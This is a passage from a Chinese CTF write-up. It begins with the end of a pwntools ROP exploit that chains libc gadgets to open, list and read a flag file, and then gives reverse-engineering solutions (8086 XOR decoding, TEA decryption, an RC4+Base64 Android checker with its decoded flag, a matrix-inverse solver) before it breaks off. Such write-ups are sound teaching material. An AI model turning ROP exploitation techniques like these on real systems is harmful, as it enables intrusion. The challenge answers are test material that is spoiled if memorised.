libc_pop_rdx_r12 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000011c371</span>
libc_pop_rcx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000009f822</span>

payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;./&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">14</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x18</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0xffffffffffffffff</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
payload <span style="color:#f92672">+=</span> p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> libc_pop_rax_rdx_rbx) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">2</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(pop_rdi) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x404130</span>) <span style="color:#f92672">+</span> p64(pop_rsi_r15) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;alarm&#34;</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">9</span>)

payload <span style="color:#f92672">+=</span> p64(pop_rdi) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">3</span>) <span style="color:#f92672">+</span> p64(pop_rsi_r15) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x404280</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)
payload <span style="color:#f92672">+=</span> p64(libc_pop_rdx_r12 <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>address) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x200</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) 
payload <span style="color:#f92672">+=</span> p64(libc_pop_rcx <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>address) <span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x404280</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x200</span>)
payload <span style="color:#f92672">+=</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;getdents64&#34;</span>])

payload <span style="color:#f92672">+=</span> p64(pop_rdi) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> p64(pop_rsi_r15) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x404280</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(libc_pop_rdx_r12 <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>address) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x200</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;write&#34;</span>]) <span style="color:#f92672">+</span> p64(main)


p<span style="color:#f92672">.</span>send(payload)
p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;done&#34;</span>)
p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;flag&#34;</span>)
tail <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">20</span>)


<span style="color:#75715e"># tail = b&#34;a74248296b5d7f3d2b01&#34;</span>

p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;size?&#34;</span>)

p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;-1&#34;</span>)

p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;content?&#34;</span>)

payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;./flag&#34;</span> <span style="color:#f92672">+</span> tail <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0xffffffffffffffff</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
payload <span style="color:#f92672">+=</span> p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> libc_pop_rax_rdx_rbx) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">2</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(pop_rdi) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x404228</span>) <span style="color:#f92672">+</span> p64(pop_rsi_r15) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;alarm&#34;</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">9</span>)
payload <span style="color:#f92672">+=</span> p64(pop_rdi) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> p64(pop_rsi_r15) <span style="color:#f92672">+</span> p64(bss<span style="color:#f92672">-</span> <span style="color:#ae81ff">0xc0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>address<span style="color:#f92672">+</span>libc_pop_rdx_r12) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x100</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)
payload <span style="color:#f92672">+=</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;read&#34;</span>])
payload <span style="color:#f92672">+=</span> p64(pop_rdi) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;write&#34;</span>])

p<span style="color:#f92672">.</span>sendline(payload)

p<span style="color:#f92672">.</span>interactive()
</code></pre></div><h3 id="reeasyasm">[RE]easyasm</h3>
<blockquote>
<p>By hidden</p>
</blockquote>
<p>考察8086汇编。</p>
<p>汇编编写，不能f5；加密较为简单；了解代码段、数据段的知识，看懂段寄存器的对应（其实猜也才出来了），看懂加密的核心逻辑即可。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">t<span style="color:#f92672">=</span>[<span style="color:#ae81ff">0x91</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0xa0</span>, <span style="color:#ae81ff">0x60</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x21</span>, <span style="color:#ae81ff">0x14</span>, <span style="color:#ae81ff">0xc</span>, <span style="color:#ae81ff">0xe2</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0xe2</span>, <span style="color:#ae81ff">0x60</span>, <span style="color:#ae81ff">0x14</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0xd1</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0xc0</span>, <span style="color:#ae81ff">0x17</span>]
<span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(len(t)):
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
        <span style="color:#66d9ef">if</span> (((i<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">4</span>)<span style="color:#f92672">%</span><span style="color:#ae81ff">256</span><span style="color:#f92672">+</span>(i<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">4</span>))<span style="color:#f92672">^</span><span style="color:#ae81ff">0x17</span><span style="color:#f92672">==</span>t[j]):
            print (chr(i), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
</code></pre></div><h3 id="recreakme">[RE]creakme</h3>
<blockquote>
<p>By s0uthwood</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
{
  <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// edx
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// esi
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> v5; <span style="color:#75715e">// edi
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> v6; <span style="color:#75715e">// ebx
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v7; <span style="color:#75715e">// esi
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v8; <span style="color:#75715e">// esi
</span><span style="color:#75715e"></span>  _DWORD v10[<span style="color:#ae81ff">17</span>]; <span style="color:#75715e">// [esp+Ch] [ebp-8Ch] BYREF
</span><span style="color:#75715e"></span>  _BYTE v11[<span style="color:#ae81ff">32</span>]; <span style="color:#75715e">// [esp+50h] [ebp-48h]
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> Arglist[<span style="color:#ae81ff">32</span>]; <span style="color:#75715e">// [esp+70h] [ebp-28h] BYREF
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v13; <span style="color:#75715e">// [esp+90h] [ebp-8h]
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v14; <span style="color:#75715e">// [esp+94h] [ebp-4h]
</span><span style="color:#75715e"></span>
  memset(Arglist, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(Arglist));
  sub_40103A(<span style="color:#e6db74">&#34;%s&#34;</span>, (<span style="color:#66d9ef">char</span>)Arglist);
  strcpy((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)v10, <span style="color:#e6db74">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#34;</span>);
  v3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  v14 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">32</span>; v14 <span style="color:#f92672">=</span> i )
  {
    v5 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>Arglist[i];
    v6 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>Arglist[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>];
    v13 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    v7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">32</span>;
    <span style="color:#66d9ef">do</span>
    {
      v3 <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x12345678</span>;
      v5 <span style="color:#f92672">+=</span> v3 <span style="color:#f92672">^</span> (v3 <span style="color:#f92672">+</span> v6) <span style="color:#f92672">^</span> (v10[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">*</span> v6) <span style="color:#f92672">^</span> (v10[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">+</span> (v6 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>));
      v6 <span style="color:#f92672">+=</span> v3 <span style="color:#f92672">^</span> (v3 <span style="color:#f92672">+</span> v5) <span style="color:#f92672">^</span> (v10[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">*</span> v5) <span style="color:#f92672">^</span> (v10[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> (v5 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>));
      <span style="color:#f92672">--</span>v7;
    }
    <span style="color:#66d9ef">while</span> ( v7 );
    v8 <span style="color:#f92672">=</span> v14;
    v3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>Arglist[v14] <span style="color:#f92672">=</span> v5;
    <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>Arglist[v8 <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> v6;
    i <span style="color:#f92672">=</span> v8 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>;
  }
  <span style="color:#f92672">*</span>(_OWORD <span style="color:#f92672">*</span>)v11 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_OWORD <span style="color:#f92672">*</span>)dword_402180;
  <span style="color:#f92672">*</span>(_OWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v11[<span style="color:#ae81ff">16</span>] <span style="color:#f92672">=</span> dword_402170;
  <span style="color:#66d9ef">while</span> ( Arglist[v3] <span style="color:#f92672">==</span> v11[v3] )
  {
    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">++</span>v3 <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">32</span> )
    {
      sub_40100C(<span style="color:#e6db74">&#34;right!&#34;</span>, v10[<span style="color:#ae81ff">0</span>]);
      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
    }
  }
  sub_40100C(<span style="color:#e6db74">&#34;wrong!&#34;</span>, v10[<span style="color:#ae81ff">0</span>]);
  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>那一串字符串看似和 Base64 有关，其实加密就是 TEA</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">decrypt</span> (<span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">*</span> v, <span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">*</span> k) {
    <span style="color:#66d9ef">uint32_t</span> delta<span style="color:#f92672">=</span><span style="color:#ae81ff">0x12345678</span>;
    <span style="color:#66d9ef">uint32_t</span> v0<span style="color:#f92672">=</span>v[<span style="color:#ae81ff">0</span>], v1<span style="color:#f92672">=</span>v[<span style="color:#ae81ff">1</span>], sum<span style="color:#f92672">=</span>delta <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span>, i;
    <span style="color:#66d9ef">uint32_t</span> k0<span style="color:#f92672">=</span>k[<span style="color:#ae81ff">0</span>], k1<span style="color:#f92672">=</span>k[<span style="color:#ae81ff">1</span>], k2<span style="color:#f92672">=</span>k[<span style="color:#ae81ff">2</span>], k3<span style="color:#f92672">=</span>k[<span style="color:#ae81ff">3</span>];
    <span style="color:#66d9ef">for</span> (i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">32</span>; i<span style="color:#f92672">++</span>) {
        v1 <span style="color:#f92672">-=</span> sum <span style="color:#f92672">^</span> ((v0<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> k0) <span style="color:#f92672">^</span> (v0 <span style="color:#f92672">+</span> sum) <span style="color:#f92672">^</span> ((v0<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">5</span>) <span style="color:#f92672">+</span> k1);
        v0 <span style="color:#f92672">-=</span> sum <span style="color:#f92672">^</span> ((v1<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> k2) <span style="color:#f92672">^</span> (v1 <span style="color:#f92672">+</span> sum) <span style="color:#f92672">^</span> ((v1<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">5</span>) <span style="color:#f92672">+</span> k3);
        sum <span style="color:#f92672">-=</span> delta;
    }
    v[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span>v0; v[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span>v1;
}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
{
    <span style="color:#66d9ef">uint32_t</span> v[]<span style="color:#f92672">=</span>{<span style="color:#ae81ff">1222194312u</span>, <span style="color:#ae81ff">51123276u</span>, <span style="color:#ae81ff">1391163586u</span>, <span style="color:#ae81ff">3986482669u</span>, <span style="color:#ae81ff">2921328102u</span>, <span style="color:#ae81ff">3126465133u</span>, <span style="color:#ae81ff">3482485930u</span>, <span style="color:#ae81ff">1709241059u</span>},k[<span style="color:#ae81ff">4</span>]<span style="color:#f92672">=</span>{<span style="color:#ae81ff">0x44434241</span>,<span style="color:#ae81ff">0x48474645</span>,<span style="color:#ae81ff">0x4c4b4a49</span>,<span style="color:#ae81ff">0x504f4e4d</span>};
    decrypt(v, k);
    decrypt(v <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>, k);
    decrypt(v <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>, k);
    decrypt(v <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>, k);
    printf(<span style="color:#e6db74">&#34;%s&#34;</span>, v);
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><h3 id="reflag-checker">[RE]Flag Checker</h3>
<blockquote>
<p>By s0uthwood</p>
</blockquote>
<p>jeb 打开</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#f92672">package</span> com.example.flagchecker<span style="color:#f92672">;</span>

<span style="color:#f92672">import</span> android.os.Bundle<span style="color:#f92672">;</span>
<span style="color:#f92672">import</span> android.support.v7.app.AppCompatActivity<span style="color:#f92672">;</span>
<span style="color:#f92672">import</span> android.util.Base64<span style="color:#f92672">;</span>
<span style="color:#f92672">import</span> android.view.View.OnClickListener<span style="color:#f92672">;</span>
<span style="color:#f92672">import</span> android.view.View<span style="color:#f92672">;</span>
<span style="color:#f92672">import</span> android.widget.Button<span style="color:#f92672">;</span>
<span style="color:#f92672">import</span> android.widget.EditText<span style="color:#f92672">;</span>
<span style="color:#f92672">import</span> android.widget.Toast<span style="color:#f92672">;</span>
<span style="color:#f92672">import</span> javax.crypto.Cipher<span style="color:#f92672">;</span>
<span style="color:#f92672">import</span> javax.crypto.spec.SecretKeySpec<span style="color:#f92672">;</span>

<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MainActivity</span> <span style="color:#66d9ef">extends</span> AppCompatActivity <span style="color:#f92672">{</span>
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> <span style="color:#a6e22e">encrypt</span><span style="color:#f92672">(</span>String arg4<span style="color:#f92672">,</span> String arg5<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
        SecretKeySpec v0 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SecretKeySpec<span style="color:#f92672">(</span>arg5<span style="color:#f92672">.</span><span style="color:#a6e22e">getBytes</span><span style="color:#f92672">(),</span> 0<span style="color:#f92672">,</span> arg5<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">(),</span> <span style="color:#e6db74">&#34;RC4&#34;</span><span style="color:#f92672">);</span>
        Cipher v5 <span style="color:#f92672">=</span> Cipher<span style="color:#f92672">.</span><span style="color:#a6e22e">getInstance</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;RC4&#34;</span><span style="color:#f92672">);</span>
        v5<span style="color:#f92672">.</span><span style="color:#a6e22e">init</span><span style="color:#f92672">(</span>1<span style="color:#f92672">,</span> v0<span style="color:#f92672">);</span>
        <span style="color:#66d9ef">return</span> v5<span style="color:#f92672">.</span><span style="color:#a6e22e">doFinal</span><span style="color:#f92672">(</span>arg4<span style="color:#f92672">.</span><span style="color:#a6e22e">getBytes</span><span style="color:#f92672">());</span>
    <span style="color:#f92672">}</span>

    <span style="color:#a6e22e">@Override</span>  <span style="color:#75715e">// android.support.v7.app.AppCompatActivity
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onCreate</span><span style="color:#f92672">(</span>Bundle arg2<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
        <span style="color:#66d9ef">super</span><span style="color:#f92672">.</span><span style="color:#a6e22e">onCreate</span><span style="color:#f92672">(</span>arg2<span style="color:#f92672">);</span>
        <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">setContentView</span><span style="color:#f92672">(</span>0x7F09001C<span style="color:#f92672">);</span>  <span style="color:#75715e">// layout:activity_main
</span><span style="color:#75715e"></span>        <span style="color:#f92672">((</span>Button<span style="color:#f92672">)</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">findViewById</span><span style="color:#f92672">(</span>0x7F070022<span style="color:#f92672">)).</span><span style="color:#a6e22e">setOnClickListener</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> View<span style="color:#f92672">.</span><span style="color:#a6e22e">OnClickListener</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>  <span style="color:#75715e">// id:button
</span><span style="color:#75715e"></span>            <span style="color:#a6e22e">@Override</span>  <span style="color:#75715e">// android.view.View$OnClickListener
</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onClick</span><span style="color:#f92672">(</span>View arg4<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
                String v4 <span style="color:#f92672">=</span> <span style="color:#f92672">((</span>EditText<span style="color:#f92672">)</span>MainActivity<span style="color:#f92672">.</span><span style="color:#a6e22e">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">findViewById</span><span style="color:#f92672">(</span>0x7F070036<span style="color:#f92672">)).</span><span style="color:#a6e22e">getText</span><span style="color:#f92672">().</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">();</span>  <span style="color:#75715e">// id:editTextTextPersonName
</span><span style="color:#75715e"></span>                <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> v2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[</span>0<span style="color:#f92672">];</span>
                <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
                    v2 <span style="color:#f92672">=</span> MainActivity<span style="color:#f92672">.</span><span style="color:#a6e22e">encrypt</span><span style="color:#f92672">(</span>v4<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;carol&#34;</span><span style="color:#f92672">);</span>
                <span style="color:#f92672">}</span>
                <span style="color:#66d9ef">catch</span><span style="color:#f92672">(</span>Exception v4_1<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
                    v4_1<span style="color:#f92672">.</span><span style="color:#a6e22e">printStackTrace</span><span style="color:#f92672">();</span>
                <span style="color:#f92672">}</span>

                <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>Base64<span style="color:#f92672">.</span><span style="color:#a6e22e">encodeToString</span><span style="color:#f92672">(</span>v2<span style="color:#f92672">,</span> 0<span style="color:#f92672">).</span><span style="color:#a6e22e">replace</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\n&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;mg6CITV6GEaFDTYnObFmENOAVjKcQmGncF90WhqvCFyhhsyqq1s=&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
                    Toast<span style="color:#f92672">.</span><span style="color:#a6e22e">makeText</span><span style="color:#f92672">(</span>MainActivity<span style="color:#f92672">.</span><span style="color:#a6e22e">this</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;Congratulations!!!&#34;</span><span style="color:#f92672">,</span> 1<span style="color:#f92672">).</span><span style="color:#a6e22e">show</span><span style="color:#f92672">();</span>
                    <span style="color:#66d9ef">return</span><span style="color:#f92672">;</span>
                <span style="color:#f92672">}</span>

                Toast<span style="color:#f92672">.</span><span style="color:#a6e22e">makeText</span><span style="color:#f92672">(</span>MainActivity<span style="color:#f92672">.</span><span style="color:#a6e22e">this</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;Fail,try again.&#34;</span><span style="color:#f92672">,</span> 1<span style="color:#f92672">).</span><span style="color:#a6e22e">show</span><span style="color:#f92672">();</span>
            <span style="color:#f92672">}</span>
        <span style="color:#f92672">});</span>
    <span style="color:#f92672">}</span>
<span style="color:#f92672">}</span>
</code></pre></div><p>RC4 + Base64</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> ARC4

cipher <span style="color:#f92672">=</span> b64decode(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;mg6CITV6GEaFDTYnObFmENOAVjKcQmGncF90WhqvCFyhhsyqq1s=&#39;</span>)

key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;carol&#39;</span>
rc4 <span style="color:#f92672">=</span> ARC4<span style="color:#f92672">.</span>new(key)

rc4<span style="color:#f92672">.</span>decrypt(cipher)
<span style="color:#75715e"># b&#39;hgame{weLC0ME_To-tHE_WORLD_oF-AnDr0|D}&#39;</span>
</code></pre></div><h3 id="re猫头鹰是不是猫">[RE]猫头鹰是不是猫</h3>
<blockquote>
<p>By SSGSS</p>
</blockquote>
<p>总结一下快捷键：</p>
<ul>
<li><code>d</code>改byte，dword，qword</li>
<li><code>shift+e</code>导出数据</li>
<li><code>y</code>重新定义数据类型</li>
<li><code>*</code>数组</li>
</ul>
<p>看懂逻辑后，做个矩阵乘法求逆即可。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#66d9ef">int</span> n<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span>;
<span style="color:#66d9ef">double</span> a[<span style="color:#ae81ff">66</span>][<span style="color:#ae81ff">66</span>],b[<span style="color:#ae81ff">66</span>][<span style="color:#ae81ff">66</span>],c[<span style="color:#ae81ff">66</span>][<span style="color:#ae81ff">130</span>],f[<span style="color:#ae81ff">64</span>];
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">gauss</span>(<span style="color:#66d9ef">double</span> (<span style="color:#f92672">*</span>A)[<span style="color:#ae81ff">130</span>])
{
    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;i<span style="color:#f92672">&lt;</span>n;i<span style="color:#f92672">++</span>)
    {
        <span style="color:#66d9ef">int</span> k<span style="color:#f92672">=</span>i;
